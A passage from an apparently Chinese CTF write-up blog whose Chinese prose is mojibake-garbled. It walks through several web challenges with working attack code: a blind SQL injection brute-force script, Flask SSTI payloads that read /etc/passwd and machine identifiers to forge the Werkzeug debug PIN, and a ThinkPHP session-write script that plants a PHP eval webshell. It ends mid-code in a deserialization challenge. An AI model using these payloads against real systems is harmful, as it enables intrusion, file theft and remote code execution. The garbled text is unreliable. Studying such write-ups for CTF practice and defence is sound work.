åˆ—åæ³¨å…¥ä¹Ÿæ²¡æ³•è¿›è¡Œï¼Œè¿™æ—¶å€™å°±ç”¨åˆ°äº†å‰é¢è¯´çš„å­¦åˆ°çš„æ–°å§¿åŠ¿äº†ï¼šåˆ©ç”¨<code>id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;</code>è¿™æ ·çš„è¯­å¥ä½¿è¿›è¡Œä¸¤åˆ—çš„å¯¹æ¯”ï¼Œä»è€Œçˆ†ç ´å‡ºç¬¬äºŒåˆ—(flagåˆ—)çš„å†…å®¹ã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<h3 id="è§£é¢˜è„šæœ¬"><a href="#è§£é¢˜è„šæœ¬" class="headerlink" title="è§£é¢˜è„šæœ¬"></a>è§£é¢˜è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'</span></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select database()),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,&#123;0&#125;)='&#123;1&#125;'"</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #ä¸å¯ç”¨ï¼Œéœ€è¦è¿›è¡Œæ— åˆ—åæŸ¥è¯¢</span></span><br><span class="line"><span class="comment"># payload = "1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,&#123;0&#125;)='&#123;1&#125;'" #ä¸å¯ç”¨ï¼Œå› ä¸ºæœ‰ä¸¤åˆ—</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'0123456789bcdehijkmnopqrstuvwxyz_-&#123;&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1, 80):</span></span><br><span class="line"><span class="string">    for n in letter:</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            "id": payload.format(i, database + n),</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        req = requests.post(url, data=data,headers=headers)</span></span><br><span class="line"><span class="string">        # print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line"><span class="string">        if "Hello Nu1L" in req.text:</span></span><br><span class="line"><span class="string">            print(n)</span></span><br><span class="line"><span class="string">            flag += n</span></span><br><span class="line"><span class="string">            print(database)</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">                a = chr(i).encode().hex()</span><br><span class="line">                payload = <span class="string">"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>%(flag.encode().hex()+a) <span class="comment">#åˆ›å»ºä¸¤åˆ—æ•°æ®å»æ¯”è¾ƒ</span></span><br><span class="line">                <span class="comment">#print("Test:"+chr(i))</span></span><br><span class="line">                html = requests.post(url=url,data=payload,headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello Nu1L"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                        flag += chr(i<span class="number">-1</span>)</span><br><span class="line">                        print(<span class="string">"Find:"</span>+flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> chr(i) == <span class="string">'&#125;'</span>:</span><br><span class="line">                flag +=<span class="string">'&#125;'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web-FlaskApp"><a href="#Web-FlaskApp" class="headerlink" title="Web-FlaskApp"></a>Web-FlaskApp</h2><p>è€ƒå¯ŸSSTI</p>
<h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªbase64åŠ å¯†è§£å¯†ç½‘ç«™ï¼Œç›´æ¥è€ƒè™‘SSTIäº†ã€‚å¹¶ä¸”è¿™ä¸ªé¢˜è·Ÿå¦å¤–ä¸€ä¸ªåˆ©ç”¨Flaskå†™çš„åŠ å¯†çš„é¢˜å¾ˆåƒï¼Œä¾¿å‚è€ƒäº†é‚£ä¸ªé¢˜çš„<a href="https://www.anquanke.com/post/id/197602?display=mobile">è§£é¢˜æ€è·¯</a>ï¼šåœ¨å¼€å¯DEBUGæ¨¡å¼çš„æƒ…å†µä¸‹è¿›è¡Œæ¨¡æ¿æ³¨å…¥ã€‚<br>é¦–å…ˆæµ‹è¯•ä¸€ä¸‹SSTIæ˜¯å¦èƒ½ç”¨ï¼šå…ˆåœ¨åŠ å¯†é¡µé¢å¯¹<code></code>åŠ å¯†ä¸€ä¸‹ï¼Œç„¶ååˆ°è§£å¯†é¡µè§£å¯†ï¼Œé¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu8.png" alt=""><br>ç”±æ­¤å¾—çŸ¥ï¼Œç¡®å®æ˜¯SSTIï¼ŒåŒæ—¶è¿˜çœ‹åˆ°äº†å¼€å¯äº†DEBUGæ¨¡å¼ã€‚<br>é‚£å°±åˆ©ç”¨é‚£é“é¢˜çš„è§£é¢˜æ€è·¯å»åšå§ã€‚</p>
<h3 id="è§£é¢˜-5"><a href="#è§£é¢˜-5" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>å‚è€ƒå‰é¢çš„é“¾æ¥æˆ‘ä»¬çŸ¥é“ï¼Œè¿™é“é¢˜å¯ä»¥é€šè¿‡è®¡ç®—å‡º<code>PIN</code>æ¥ç™»å½•æ§åˆ¶å°ï¼Œç„¶ååœ¨æ§åˆ¶å°è¿›è¡Œæ“ä½œæ‹¿flagã€‚ä½†æ˜¯ç”Ÿæˆ<code>PIN</code>çš„è„šæœ¬éœ€è¦çŸ¥é“<code>username</code>(è¿™ä¸ªéœ€è¦æˆ‘ä»¬è‡ªå·±å»æ‰¾)ã€<code>modname</code>(ä¸€èˆ¬æ˜¯<code>flask.app</code>)ã€ç¬¬ä¸‰ä¸ªå€¼<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>(ä¸€èˆ¬æ˜¯<code>Flask</code>)ã€ç¬¬å››ä¸ªå€¼<code>getattr(mod, &quot;__file__&quot;, None)</code>(åœ¨æŠ¥é”™é¡µé¢å¯ä»¥çœ‹åˆ°é¢˜ç›®çš„ç¯å¢ƒ)ã€ç¬¬äº”ä¸ªæ˜¯<code>str(uuid.getnode())</code>çš„å€¼ï¼Œæœ€åæ˜¯æœºå™¨ç ã€‚<br>æŠ¥é”™é¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu9.png" alt=""></p>
<h4 id="è·å–username"><a href="#è·å–username" class="headerlink" title="è·å–username"></a>è·å–username</h4><p>å¯ä»¥åœ¨<code>/etc/passwd</code>ä¸­è¯»å–åˆ°ç”¨æˆ·åï¼Œè¿™é‡Œç”±äºé¢˜ç›®ç¯å¢ƒæ˜¯Python3çš„ï¼Œå› æ­¤è¯»æ–‡ä»¶éœ€è¦ç”¨å¦‚ä¸‹payloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¯å¢ƒæ˜¯Python2ï¼Œpayloadå¯ä»¥æ„é€ ä¸ºï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿå‰é¢çš„æ“ä½œä¸€æ ·ï¼Œå…ˆç¼–ç ï¼Œå†å»è§£ç å¼•å‘SSTIï¼Œå›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu13.png" alt=""><br>æˆ‘ä»¬çœ‹åˆ°å¯ä»¥ç”¨æˆ·å<code>flaskweb</code>ï¼Œåº”è¯¥å°±æ˜¯å®ƒäº†ã€‚</p>
<p><code>modename</code>ä»¥åŠç¬¬ä¸‰ä¸ªã€ç¬¬å››ä¸ªå·²ç»çŸ¥é“äº†ï¼Œç›´æ¥å»æ‰¾<code>str(uuid.getnode())</code>çš„å€¼ã€‚</p>
<h4 id="è·å–str-uuid-getnode"><a href="#è·å–str-uuid-getnode" class="headerlink" title="è·å–str(uuid.getnode())"></a>è·å–str(uuid.getnode())</h4><p>æ„é€ payloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§åŒæ ·çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼Œå¾—åˆ°å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu14.png" alt=""><br>ç„¶ååˆ°<a href="https://tool.oschina.net/hexconvert/">è¿›åˆ¶è½¬æ¢ç½‘ç«™</a>è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚</p>
<h4 id="è·å–æœºå™¨ç "><a href="#è·å–æœºå™¨ç " class="headerlink" title="è·å–æœºå™¨ç "></a>è·å–æœºå™¨ç </h4><p>æ„é€ payloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu15.png" alt=""><br>ç¬¬ä¸€é¡¹<code>/docker/</code>åé¢çš„å­—ç¬¦ä¸²å³ä¸ºæˆ‘ä»¬è¦æ‰¾çš„æœºå™¨ç ã€‚<br>è‡³æ­¤ï¼Œæ‹¿åˆ°äº†ç”Ÿæˆ<code>PIN</code>çš„æ‰€æœ‰çš„è¦ç´ äº†ï¼Œåˆ©ç”¨ä¸‹é¢çš„è„šæœ¬ç”Ÿæˆ<code>PIN</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957890'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ°é¢˜ç›®çš„é“¾æ¥åé¢åŠ ä¸Š<code>/console</code>è¿›å…¥æ§åˆ¶é¢æ¿ï¼Œè¾“å…¥PINï¼Œè·å–æƒé™ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu16.png" alt=""><br>ç„¶åå°±å¯ä»¥éšæ„è¾“å…¥è¯»å–æ–‡ä»¶æ‹¿flagäº†(æ³¨æ„åˆ—ä¸¾æ–‡ä»¶çš„æ—¶å€™ä¹Ÿå¯ä»¥ç›´æ¥åˆ—ä¸¾æ ¹ç›®å½•çš„<code>ls /</code>)ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu17.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu18.png" alt=""></p>
<h2 id="Web-easy-thinking"><a href="#Web-easy-thinking" class="headerlink" title="Web-easy_thinking"></a>Web-easy_thinking</h2><p>è€ƒå¯Ÿ<code>ThinkPHP6.0</code>å­˜åœ¨çš„é€šè¿‡<code>SESSION</code>å†™æ–‡ä»¶çš„æ¼æ´ï¼ŒåŒæ—¶ä¹Ÿè€ƒå¯Ÿäº†å¯¹<code>disable_functions</code>çš„ç»•è¿‡ã€‚<br>è¿™ä¸€é“é¢˜æ¯”èµ›çš„æ—¶å€™çŸ¥é“è€ƒå¯Ÿç‚¹æ˜¯SESSIONæ¼æ´äº†ï¼Œä½†æ˜¯ç”±äºæ—¶é—´åŸå› å½“æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œåæ¥ç»smityå¸ˆå‚…æç¤ºï¼Œç»“åˆgetflyå¸ˆå‚…çš„é¢˜è§£ï¼Œå¯¹è¿™é“é¢˜åŠ æ·±äº†ç†è§£å’Œå­¦ä¹ ã€‚åœ¨BUUä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç”±äºç¯å¢ƒæ˜¯<code>ThinkPHP6.0</code>ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„æ¼æ´æ–‡ç« ï¼š<br><a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a><br><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a><br>å°±æ˜¯é€šè¿‡åˆ©ç”¨<code>SESSION</code>å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶ï¼Œä»è€Œæ‹¿åˆ°shellã€‚</p>
<p>æ—¢ç„¶æ˜¯é€šè¿‡SESSIONå†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å­˜åœ¨SESSIONå†™å…¥çš„ä½ç½®ï¼Œåœ¨<code>Member</code>æ§åˆ¶å™¨ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!session(<span class="string">'?UID'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/home/member/login'</span>);            </span><br><span class="line">&#125;</span><br><span class="line">$data = input(<span class="string">"post."</span>);</span><br><span class="line">$record = session(<span class="string">"Record"</span>);</span><br><span class="line"><span class="keyword">if</span> (!session(<span class="string">"Record"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    session(<span class="string">"Record"</span>,$data[<span class="string">"key"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>search</code>æ–¹æ³•ä¸­å¯ä»¥è¿›è¡Œä»»æ„SESSIONå†™å…¥ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å°±å¯ä»¥å†™å…¥æ„é€ å¥½çš„å†…å®¹æ¥ç”Ÿæˆshellï¼Œä½†æ˜¯é¦–å…ˆå°±éœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå³éœ€è¦ä¸€ä¸ªç°æœ‰çš„SESSIONæ–‡ä»¶å¹¶ä¸”åŒ…å«<code>UID</code>å­—æ®µï¼Œä¸‹é¢å°±éœ€è¦æ‰¾åˆ°å°†<code>UID</code>å†™å…¥SESSIONçš„åœ°æ–¹ã€‚<br>åœ¨<code>Member</code>æ§åˆ¶å™¨çš„<code>login</code>æ–¹æ³•ä¸­æ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userId)&#123;</span><br><span class="line">    session(<span class="string">"UID"</span>,$userId);</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/home/member/index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†<code>UID</code>å†™å…¥SESSIONçš„æ“ä½œæ˜¯åœ¨åˆ¤æ–­ç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ä¹‹åçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚</p>
<p>æ‹ä¸€ä¸‹æ•´ä¸ªçš„æ€è·¯ï¼š</p>
<ul>
<li>1ã€æ³¨å†Œä¸€ä¸ªåˆæ³•è´¦æˆ·</li>
<li>2ã€åˆ©ç”¨æ³¨å†Œçš„è´¦æˆ·ç™»å½•æ—¶æ›´æ”¹<code>SESSION</code>å­—æ®µçš„å€¼ä¸º<code>xxx.php</code>ï¼Œå¹¶ä¸”åˆšå¥½æ˜¯32ä¸ªå­—ç¬¦</li>
<li>3ã€åˆ©ç”¨ç›¸åŒçš„<code>SESSION</code>åœ¨æœç´¢çš„æ—¶å€™å†™å…¥ä¸€å¥è¯</li>
<li>4ã€åœ¨<code>/runtime/session</code>æ–‡ä»¶å¤¹ä¸‹æµ‹è¯•ä¸€å¥è¯ï¼Œæ³¨æ„æ˜¯<code>sess_</code>å¼€å¤´çš„</li>
</ul>
<p>å‚è€ƒgetflyå¸ˆå‚…çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url_reg = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'</span></span><br><span class="line">url_log = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'</span></span><br><span class="line">url_sea = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'</span></span><br><span class="line">headers = &#123; <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=1234567890123456789012345678.php'</span> &#125;</span><br><span class="line">data1 = &#123;<span class="string">'username'</span>:<span class="string">'ggb0n'</span>, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;</span><br><span class="line">data2 = &#123;<span class="string">'key'</span>:<span class="string">'&lt;?php @eval($_POST["x"]);echo "not flag"; ?&gt;'</span>&#125;</span><br><span class="line">s1 = requests.post(url_reg, data1)</span><br><span class="line">s2 = requests.post(url_log, data1, headers=headers)</span><br><span class="line">s3 = requests.post(url_sea, data2, headers=headers)</span><br><span class="line">test = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php'</span></span><br><span class="line">s = requests.get(test).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'not flag'</span> <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="string">'success'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'failed'</span>)</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥å°é©¬ä¹‹ååœ¨ç»ˆç«¯è¿è¡Œ<code>/readflag</code>æ˜¯æ²¡ç”¨çš„ï¼Œåˆ©ç”¨<code>phpinfo()</code>å‘ç°æ˜¯å› ä¸º<code>disable_functions</code>æŠŠ<code>system</code>ç»™banæ‰äº†ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu28.png" alt=""><br>é‚£å°±éœ€è¦ç»•è¿‡é™åˆ¶ï¼Œsmityå¸ˆå‚…æ¯”èµ›çš„æ—¶å€™å°±æé†’éœ€è¦ç”¨<code>php_gc_uaf.php</code>æ¥ç»•è¿‡<code>disable_functhions</code>ï¼Œä¸€äº›ç»•è¿‡æ–¹æ³•å‚è€ƒ<a href="https://blog.csdn.net/jia3643/article/details/104200164">è¿™é‡Œ</a>ã€‚<br>æŠŠ<code>php_gc_uaf.php</code>ä¼ åˆ°ä¸€ä¸ª<code>777</code>æƒé™çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶ååœ¨æµè§ˆå™¨ç«¯è®¿é—®è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flagã€‚</p>
<p>ã€è¡¥å……ã€‘è¿™ä¸ª<a href="https://www.exploit-db.com/exploits/48072">exp</a>ä¸ç”¨777æƒé™çš„æ–‡ä»¶å¤¹å°±èƒ½æ‰§è¡Œï¼Œwebç›®å½•å³å¯ã€‚é«˜æ ¡æˆ˜â€œç–«â€ä¸­çš„PHP-UAFå°±æ˜¯ç”¨çš„è¿™ä¸ªã€‚</p>
<h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><p>è€ƒå¯Ÿååºåˆ—åŒ–é€ƒé€¸æ¼æ´ï¼Œè¿™ä¸ªä¹‹å‰åœ¨BUUä¸Šåˆ·äº†<a href="http://47.107.152.5/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">ä¸€é“ç±»ä¼¼çš„é¢˜ç›®</a>ï¼Œä¸è¿‡æ›´åŠ å¤æ‚ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†WPè®°å½•å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‰«æåå°å¯ä»¥å‘ç°å­˜åœ¨æºç <code>www.zip</code>ï¼Œä¸‹è½½åæ˜¯å››ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸»è¦åˆ†æä¸æ‹¿flagç›¸å…³çš„ä»£ç ã€‚<br>é¦–å…ˆä»<code>update.php</code>ä¸­å‘ç°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œç™»é™†æˆåŠŸä¹‹åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p>
<p>ç„¶åå®¡è®¡å…³é”®æ–‡ä»¶<code>lib.php</code>ï¼Œåœ¨å…¶ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°è¿™é‡Œï¼Œå°±æƒ³åˆ°äº†ä¹‹å‰åœ¨BUUä¸Šåˆ·çš„<strong>[0CTF 2016]piapiapia</strong>ï¼Œé‚£é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯ååºåˆ—åŒ–æº¢å‡ºæ¼æ´ï¼Œè¿™ä¹Ÿå°±æ˜¯åˆ†æçš„å…³é”®äº†ã€‚<br>å†å¾€ä¸‹çœ‹ï¼Œåœ¨<code>UpdateHelper</code>ç±»ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„ç”¨æˆ·å¯æ§çš„åªæœ‰<code>Info</code>ç±»ä¸­çš„ä¸¤ä¸ªå±æ€§<code>age</code>ã€<code>nickname</code>ï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶åºåˆ—åŒ–æ•°æ®ï¼Œæ— æ³•æ³¨å…¥å¯¹è±¡ã€‚<br>è·Ÿè¿›<code>User</code>ç±»ä¸­çš„ååºåˆ—åŒ–ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    